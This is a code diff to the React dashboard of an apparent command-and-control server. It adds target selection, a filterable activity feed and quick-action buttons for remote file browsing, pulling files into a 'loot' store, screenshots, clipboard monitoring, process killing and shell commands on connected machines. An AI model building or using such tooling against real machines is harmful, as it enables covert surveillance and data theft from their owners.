@@ -113,6 +113,8 @@ export default function App() {
   const [clients, setClients] = useState<Client[]>([]);
   const [logs, setLogs] = useState<CommandLog[]>([]);
   const [printedLogIds, setPrintedLogIds] = useState<Set<number>>(new Set());
+  const [selectedClientId, setSelectedClientId] = useState<string>('');
+  const [activityFilter, setActivityFilter] = useState<'all' | 'files' | 'processes' | 'commands'>('all');
   
   // File Explorer State
   const [fileSubTab, setFileSubTab] = useState<'explorer' | 'loot'>('explorer');
@@ -484,6 +486,133 @@ export default function App() {
     return () => window.removeEventListener('keydown', handleKeyDown);
   }, [previewOpen]);
 
+  // Helper: Format raw C2 activity logs into human-readable event items
+  const formatActivityLog = (log: CommandLog) => {
+    const output = log.output || '';
+    const cmd = log.command || '';
+
+    if (output.startsWith('[JSON_FILES]')) {
+      try {
+        const data = JSON.parse(output.replace('[JSON_FILES]', ''));
+        const path = data.path || 'Directory';
+        return {
+          category: 'files',
+          icon: <FolderOpen className="w-4 h-4 text-amber-400 shrink-0" />,
+          badge: 'EXPLORER',
+          badgeClass: 'bg-amber-500/10 text-amber-400 border-amber-500/30',
+          title: `Explored Directory`,
+          detail: path,
+          meta: `${data.count || (data.items ? data.items.length : 0)} items found`
+        };
+      } catch {}
+    }
+
+    if (output.startsWith('[JSON_PREVIEW]')) {
+      try {
+        const data = JSON.parse(output.replace('[JSON_PREVIEW]', ''));
+        const isImg = data.type === 'image';
+        return {
+          category: 'files',
+          icon: isImg ? <ImageIcon className="w-4 h-4 text-emerald-400 shrink-0" /> : <FileText className="w-4 h-4 text-sky-400 shrink-0" />,
+          badge: isImg ? 'IMAGE' : 'PREVIEW',
+          badgeClass: isImg ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' : 'bg-sky-500/10 text-sky-400 border-sky-500/30',
+          title: isImg ? `Live Image Preview` : `Document Loaded`,
+          detail: data.name || 'File',
+          meta: data.size || 'Streamed'
+        };
+      } catch {}
+    }
+
+    if (output.startsWith('[JSON_PROCS]')) {
+      try {
+        const data = JSON.parse(output.replace('[JSON_PROCS]', ''));
+        const count = Array.isArray(data) ? data.length : 0;
+        return {
+          category: 'processes',
+          icon: <Cpu className="w-4 h-4 text-violet-400 shrink-0" />,
+          badge: 'PROCESSES',
+          badgeClass: 'bg-violet-500/10 text-violet-400 border-violet-500/30',
+          title: `Process Map Synchronized`,
+          detail: `${count} active processes enumerated`,
+          meta: 'Process Table'
+        };
+      } catch {}
+    }
+
+    if (cmd.startsWith('download ')) {
+      const fileName = cmd.split('download ')[1]?.replace(/["']/g, '').split(/[/\\]/).pop() || 'Artifact';
+      return {
+        category: 'files',
+        icon: <Download className="w-4 h-4 text-sky-400 shrink-0" />,
+        badge: 'DOWNLOAD',
+        badgeClass: 'bg-sky-500/10 text-sky-400 border-sky-500/30',
+        title: `Artifact Saved to Loot`,
+        detail: fileName,
+        meta: 'Loot Store'
+      };
+    }
+
+    if (cmd === 'screenshot') {
+      return {
+        category: 'commands',
+        icon: <Monitor className="w-4 h-4 text-cyan-400 shrink-0" />,
+        badge: 'SCREENSHOT',
+        badgeClass: 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30',
+        title: `Display Screenshot Captured`,
+        detail: 'Remote monitor frame saved to loot gallery',
+        meta: 'Display Frame'
+      };
+    }
+
+    if (cmd === 'sysinfo') {
+      return {
+        category: 'commands',
+        icon: <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />,
+        badge: 'SYSINFO',
+        badgeClass: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30',
+        title: `System Diagnostics Gathered`,
+        detail: output.split('\n')[0] || 'Hardware & OS diagnostics',
+        meta: 'System Telemetry'
+      };
+    }
+
+    if (cmd.startsWith('killproc ')) {
+      const target = cmd.split('killproc ')[1]?.replace(/["']/g, '');
+      return {
+        category: 'processes',
+        icon: <Square className="w-4 h-4 text-rose-400 shrink-0" />,
+        badge: 'KILL',
+        badgeClass: 'bg-rose-500/10 text-rose-400 border-rose-500/30',
+        title: `Terminated Process`,
+        detail: `PID/Target: ${target}`,
+        meta: 'Process Kill'
+      };
+    }
+
+    if (cmd.startsWith('clip')) {
+      return {
+        category: 'commands',
+        icon: <Clipboard className="w-4 h-4 text-amber-300 shrink-0" />,
+        badge: 'CLIPBOARD',
+        badgeClass: 'bg-amber-500/10 text-amber-300 border-amber-500/30',
+        title: cmd === 'clipwatch' ? 'Clipboard Monitor Activated' : 'Clipboard Buffer Checked',
+        detail: output.substring(0, 70) || cmd,
+        meta: 'Clipboard Stream'
+      };
+    }
+
+    const firstLine = output.trim().split('\n')[0] || 'Executed successfully';
+    return {
+      category: 'commands',
+      icon: <TermIcon className="w-4 h-4 text-slate-400 shrink-0" />,
+      badge: 'SHELL',
+      badgeClass: 'bg-slate-800 text-slate-400 border-slate-700',
+      title: `Executed: ${cmd}`,
+      detail: firstLine.length > 70 ? firstLine.substring(0, 70) + '...' : firstLine,
+      meta: log.status
+    };
+  };
+
   const fetchProcesses = (silent: boolean = true) => {
     if (clients.length === 0) return;
     setIsProcessesLoading(true);
@@ -554,7 +683,9 @@ export default function App() {
   const executeCommand = async (cmd: string, silent: boolean = false) => {
     if (!cmd.trim() || clients.length === 0) return;
     
-    const targetId = clients[0].id; // Default to first client for demo
+    const targetId = selectedClientId && clients.some(c => c.id === selectedClientId)
+      ? selectedClientId
+      : (clients[0]?.id || '');
     if (!silent) {
       setTermLogs(prev => [...prev, `> ${cmd}`]);
     }
@@ -647,11 +778,29 @@ export default function App() {
             <span className="text-sm font-bold text-c2accent uppercase tracking-wide">{activeTab}</span>
           </div>
           <div className="flex items-center space-x-3">
-            <Tooltip text="The currently selected remote machine" position="bottom">
-              <span className="text-xs px-2.5 py-1 bg-c2card border border-c2border rounded font-mono text-slate-300">
-                Target: {clients.length > 0 ? clients[0].host : 'None Selected'}
-              </span>
-            </Tooltip>
+            {/* Target Machine Selector */}
+            {clients.length > 1 ? (
+              <div className="flex items-center space-x-1.5 bg-c2card border border-c2border rounded px-2.5 py-1">
+                <span className="text-[10px] text-slate-400 uppercase font-bold">Target:</span>
+                <select
+                  value={selectedClientId || (clients[0]?.id || '')}
+                  onChange={(e) => setSelectedClientId(e.target.value)}
+                  className="bg-transparent text-xs font-mono text-c2accent font-bold outline-none cursor-pointer"
+                >
+                  {clients.map(c => (
+                    <option key={c.id} value={c.id} className="bg-slate-900 text-slate-200">
+                      {c.host} ({c.ip})
+                    </option>
+                  ))}
+                </select>
+              </div>
+            ) : (
+              <Tooltip text="The currently selected remote machine" position="bottom">
+                <span className="text-xs px-2.5 py-1 bg-c2card border border-c2border rounded font-mono text-slate-300">
+                  Target: {clients.length > 0 ? clients[0].host : 'None Selected'}
+                </span>
+              </Tooltip>
+            )}
             <Tooltip text={serverRunning ? "Shut down the C2 listener" : "Start the C2 listener"} position="bottom">
               <button 
                 onClick={() => setServerRunning(!serverRunning)}
@@ -680,7 +829,13 @@ export default function App() {
                   { label: 'Active Endpoints', val: clients.length, icon: Monitor, color: 'text-c2accent', tip: 'Number of connected remote clients' },
                   { label: 'Server Uptime', val: uptime, icon: RefreshCw, color: 'text-emerald-400', tip: 'Time since C2 server started' },
                   { label: 'Total Logs', val: logs.length, icon: Database, color: 'text-purple-400', tip: 'Total commands executed' },
-                  { label: 'Current Target', val: clients.length > 0 ? clients[0].host : 'NONE', icon: ShieldCheck, color: 'text-amber-400', tip: 'Selected machine for commands' },
+                  { 
+                    label: 'Current Target', 
+                    val: (clients.find(c => c.id === selectedClientId) || clients[0])?.host || 'NONE', 
+                    icon: ShieldCheck, 
+                    color: 'text-amber-400', 
+                    tip: 'Selected machine for commands' 
+                  },
                 ].map((stat, idx) => {
                   const Icon = stat.icon;
                   return (
@@ -695,6 +850,48 @@ export default function App() {
                     </Tooltip>
                   );
                 })}
+              </div>
+
+              {/* Operator Quick Launchpad */}
+              <div className="bg-c2card border border-c2border p-4 rounded flex items-center justify-between">
+                <div className="flex items-center space-x-2">
+                  <span className="text-xs font-bold uppercase tracking-wider text-slate-400">Quick Actions:</span>
+                  <span className="text-[10px] text-slate-500 font-mono">Targeting: {(clients.find(c => c.id === selectedClientId) || clients[0])?.host || 'None'}</span>
+                </div>
+                <div className="flex items-center space-x-2">
+                  <button
+                    onClick={() => setActiveTab('files')}
+                    className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 border border-c2border rounded text-xs font-medium text-amber-400 flex items-center space-x-1.5 transition-colors"
+                  >
+                    <FolderOpen className="w-3.5 h-3.5" />
+                    <span>Remote Files</span>
+                  </button>
+                  <button
+                    onClick={() => {
+                      executeCommand('screenshot');
+                      setActiveTab('files');
+                      setFileSubTab('loot');
+                    }}
+                    className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 border border-c2border rounded text-xs font-medium text-cyan-400 flex items-center space-x-1.5 transition-colors"
+                  >
+                    <Monitor className="w-3.5 h-3.5" />
+                    <span>Capture Screen</span>
+                  </button>
+                  <button
+                    onClick={() => setActiveTab('processes')}
+                    className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 border border-c2border rounded text-xs font-medium text-violet-400 flex items-center space-x-1.5 transition-colors"
+                  >
+                    <Cpu className="w-3.5 h-3.5" />
+                    <span>Process Map</span>
+                  </button>
+                  <button
+                    onClick={() => setActiveTab('terminal')}
+                    className="px-3 py-1.5 bg-c2accent text-slate-900 hover:opacity-90 font-bold rounded text-xs flex items-center space-x-1.5 transition-opacity"
+                  >
+                    <TermIcon className="w-3.5 h-3.5" />
+                    <span>Command Center</span>
+                  </button>
+                </div>
               </div>
 
               {/* Active Endpoints Table */}
@@ -724,24 +921,41 @@ export default function App() {
                           <th className="p-3">IP Address</th>
                           <th className="p-3 text-center">PID</th>
                           <th className="p-3">OS</th>
+                          <th className="p-3 text-center">Target</th>
                           <th className="p-3 text-center">Status</th>
                         </tr>
                       </thead>
                       <tbody className="divide-y divide-c2border text-[11px]">
-                        {clients.map((c, i) => (
-                          <tr key={i} className="hover:bg-slate-800/30 transition-colors">
-                            <td className="p-3 font-mono text-c2accent">{c.id}</td>
-                            <td className="p-3 font-bold text-slate-200">{c.host} <span className="text-slate-500 font-normal ml-1">({c.user})</span></td>
-                            <td className="p-3 font-mono text-slate-400">{c.ip}</td>
-                            <td className="p-3 font-mono text-center text-slate-400">{c.pid}</td>
-                            <td className="p-3 text-slate-400 truncate max-w-[150px]">{c.os}</td>
-                            <td className="p-3 text-center">
-                              <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[9px] font-bold rounded">
-                                {c.status}
-                              </span>
-                            </td>
-                          </tr>
-                        ))}
+                        {clients.map((c, i) => {
+                          const isTarget = (selectedClientId ? selectedClientId === c.id : i === 0);
+                          return (
+                            <tr 
+                              key={i} 
+                              onClick={() => setSelectedClientId(c.id)}
+                              className={`hover:bg-slate-800/30 transition-colors cursor-pointer ${isTarget ? 'bg-c2accent/5 border-l-2 border-l-c2accent' : ''}`}
+                            >
+                              <td className="p-3 font-mono text-c2accent">{c.id}</td>
+                              <td className="p-3 font-bold text-slate-200">{c.host} <span className="text-slate-500 font-normal ml-1">({c.user})</span></td>
+                              <td className="p-3 font-mono text-slate-400">{c.ip}</td>
+                              <td className="p-3 font-mono text-center text-slate-400">{c.pid}</td>
+                              <td className="p-3 text-slate-400 truncate max-w-[150px]">{c.os}</td>
+                              <td className="p-3 text-center">
+                                {isTarget ? (
+                                  <span className="px-2 py-0.5 bg-c2accent/20 border border-c2accent/40 text-c2accent text-[9px] font-bold rounded">
+                                    ACTIVE TARGET
+                                  </span>
+                                ) : (
+                                  <span className="text-[10px] text-slate-600 hover:text-slate-400">Click to target</span>
+                                )}
+                              </td>
+                              <td className="p-3 text-center">
+                                <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[9px] font-bold rounded">
+                                  {c.status}
+                                </span>
+                              </td>
+                            </tr>
+                          );
+                        })}
                       </tbody>
                     </table>
                   )}
@@ -753,25 +967,81 @@ export default function App() {
                 {/* Recent Activity Feed */}
                 <div className="col-span-2 bg-c2card border border-c2border rounded overflow-hidden flex flex-col">
                   <div className="p-4 border-b border-c2border bg-slate-900/30 flex items-center justify-between">
-                    <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400">Recent C2 Activity</h2>
-                    <span className="text-[10px] bg-c2accent/10 text-c2accent px-2 py-0.5 rounded border border-c2accent/20">LIVE FEED</span>
+                    <div className="flex items-center space-x-3">
+                      <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400">Recent C2 Activity</h2>
+                      {/* Filter Pills */}
+                      <div className="flex items-center space-x-1 bg-slate-900/60 p-0.5 rounded border border-c2border">
+                        {[
+                          { id: 'all', label: 'ALL' },
+                          { id: 'files', label: 'FILES' },
+                          { id: 'processes', label: 'PROCS' },
+                          { id: 'commands', label: 'SHELL' },
+                        ].map((f) => (
+                          <button
+                            key={f.id}
+                            onClick={() => setActivityFilter(f.id as any)}
+                            className={`px-2 py-0.5 rounded text-[9px] font-bold tracking-wider transition-colors ${
+                              activityFilter === f.id
+                                ? 'bg-c2accent text-slate-900'
+                                : 'text-slate-400 hover:text-slate-200'
+                            }`}
+                          >
+                            {f.label}
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+                    <span className="text-[10px] bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded border border-emerald-500/20 flex items-center space-x-1">
+                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                      <span>LIVE FEED</span>
+                    </span>
                   </div>
-                  <div className="divide-y divide-c2border max-h-64 overflow-y-auto flex-1">
+                  <div className="divide-y divide-c2border max-h-72 overflow-y-auto flex-1">
                     {logs.length === 0 ? (
                       <div className="p-8 text-center text-slate-500 text-xs italic">Waiting for activity...</div>
                     ) : (
-                      [...logs].reverse().slice(0, 6).map((log, i) => (
-                        <div key={i} className="p-3 hover:bg-slate-800/30 transition-colors flex items-center justify-between">
-                          <div className="flex items-center space-x-3">
-                            <div className={`h-2 w-2 rounded-full ${log.status === 'SUCCESS' ? 'bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.5)]' : 'bg-amber-400 animate-pulse'}`}></div>
-                            <div>
-                              <div className="text-xs font-bold text-slate-200">{log.command} <span className="text-[10px] text-slate-500 font-normal ml-1">→ {log.client_id}</span></div>
-                              <div className="text-[10px] text-slate-400 font-mono truncate max-w-md">{log.output.substring(0, 100)}...</div>
+                      (() => {
+                        const formattedLogs = [...logs]
+                          .reverse()
+                          .map(l => ({ log: l, event: formatActivityLog(l) }))
+                          .filter(({ event }) => activityFilter === 'all' || event.category === activityFilter);
+
+                        if (formattedLogs.length === 0) {
+                          return (
+                            <div className="p-8 text-center text-slate-500 text-xs italic">
+                              No events matching filter "{activityFilter}"
+                            </div>
+                          );
+                        }
+
+                        return formattedLogs.slice(0, 10).map(({ log, event }, i) => (
+                          <div key={i} className="p-3.5 hover:bg-slate-800/40 transition-colors flex items-center justify-between group">
+                            <div className="flex items-center space-x-3 min-w-0 flex-1">
+                              <div className="p-2 rounded-lg bg-slate-900 border border-c2border shrink-0">
+                                {event.icon}
+                              </div>
+                              <div className="min-w-0 flex-1">
+                                <div className="flex items-center space-x-2">
+                                  <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider border ${event.badgeClass}`}>
+                                    {event.badge}
+                                  </span>
+                                  <span className="text-xs font-bold text-slate-200 truncate">{event.title}</span>
+                                  <span className="text-[10px] text-slate-500 font-mono truncate">→ {log.client_id}</span>
+                                </div>
+                                <div className="text-[11px] text-slate-400 font-mono truncate mt-0.5 flex items-center space-x-2">
+                                  <span className="truncate">{event.detail}</span>
+                                  {event.meta && (
+                                    <span className="text-slate-600 shrink-0">• {event.meta}</span>
+                                  )}
+                                </div>
+                              </div>
+                            </div>
+                            <div className="text-[10px] font-mono text-slate-500 shrink-0 ml-3">
+                              {log.timestamp.split(' ')[1] || log.timestamp}
                             </div>
                           </div>
-                          <div className="text-[10px] font-mono text-slate-500">{log.timestamp.split(' ')[1]}</div>
-                        </div>
-                      ))
+                        ));
+                      })()
                     )}
                   </div>
                 </div>
